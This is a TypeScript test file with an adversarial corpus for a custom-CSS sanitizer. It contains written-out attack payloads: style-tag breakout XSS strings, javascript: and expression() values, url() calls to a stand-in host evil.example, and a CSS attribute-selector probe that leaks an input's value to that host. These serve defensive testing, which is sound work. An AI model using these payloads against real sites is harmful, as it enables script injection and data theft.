import { describe, expect, it } from "vitest";

import { sanitizeCustomCss } from "./css-sanitize";

const SCOPE = "nx-pb-page";

/**
 * Adversarial custom-CSS corpus (spec §14) — complements css-sanitize.test.ts. The
 * sanitizer must never emit `@import`, script/style tags, a URL that leaves this
 * origin, or let a value break out of its declaration/selector into an unscoped
 * rule.
 */
describe("custom CSS adversarial corpus", () => {
  const clean = (css: string): string => sanitizeCustomCss(css, SCOPE).css;

  it("never emits @import in any form", () => {
    for (const css of [
      '@import "evil.css";',
      "@import url(evil.css);",
      '@media screen { @import "x"; a { color: red } }',
    ]) {
      expect(clean(css).toLowerCase()).not.toContain("@import");
    }
  });

  it("drops javascript:/expression() inside values (incl. background url)", () => {
    const out = clean(
      "a { background: url(javascript:alert(1)); width: expression(alert(1)); }"
    ).toLowerCase();
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("expression(");
  });

  it("does not let a value break out into an unscoped rule", () => {
    const out = clean("a { color: red } body { display: none }");
    // every surviving selector must be scoped under the page root
    const selectors = out.match(/[^{}]+(?=\{)/g) ?? [];
    for (const sel of selectors) {
      expect(sel).toContain(SCOPE);
    }
    // a bare, unscoped `body` rule must not survive
    expect(out).not.toMatch(/(^|})\s*body\s*\{/);
  });

  it("scopes rules nested inside at-rules (never raw)", () => {
    const out = clean(
      "@supports (display: grid) { @media screen { a { color: red } } }"
    );
    if (out.includes("color")) {
      expect(out).toContain(SCOPE);
    }
  });

  it("cannot end the style element, however the markup is spelled", () => {
    // Both spellings, because only one of them used to get through. The escaped
    // form contains no markup in the source: `csstree.generate` decodes it into
    // markup on the way out, which is why this is checked on the output.
    for (const attempt of [
      "a{color:red}</style><script>alert(1)</script><style>b{}",
      `a{content:"\\3c /style>\\3c img src=x onerror=alert(1)>"}`,
      `a{background:url("\\3c /style>")}`,
      `a{content:"\\3c !--"}`,
    ]) {
      const out = clean(attempt).toLowerCase();
      expect(out).not.toContain("</style");
      expect(out).not.toContain("</script");
      expect(out).not.toContain("<!");
    }
  });

  it("returns a string (never throws) on deeply malformed input", () => {
    expect(typeof clean("a { b { c { d { color: }}}} ) ( @@ !!")).toBe(
      "string"
    );
  });
});

describe("custom CSS reaches no other origin", () => {
  const clean = (css: string): string => sanitizeCustomCss(css, SCOPE).css;

  it("emits no request to another host, however the URL is written", () => {
    for (const css of [
      `.a { background: url(https://evil.example/a) }`,
      `.a { background: url("https://evil.example/a") }`,
      `.a { background: url('https://evil.example/a') }`,
      `.a { background: url(  //evil.example/a  ) }`,
      `.a { background: url("\\68 ttps://evil.example/a") }`,
      `.a { background: image-set(url("https://evil.example/a") 1x) }`,
      `.a { border-image: url("https://evil.example/a") 30 round }`,
      `@media screen { .a { background: url("https://evil.example/a") } }`,
      `.a { cursor: url("https://evil.example/a"), auto }`,
    ]) {
      expect(clean(css)).not.toContain("evil.example");
    }
  });

  it("closes the selector-plus-URL channel that reads a value out", () => {
    // The attack this policy exists for: each rule fires a request only when the
    // prefix matches, so a page of them spells the value out.
    const probes = ["a", "b", "c"]
      .map(
        c =>
          `input[value^="${c}"] { background: url("https://evil.example/${c}") }`
      )
      .join("\n");
    expect(clean(probes)).not.toContain("evil.example");
  });
});
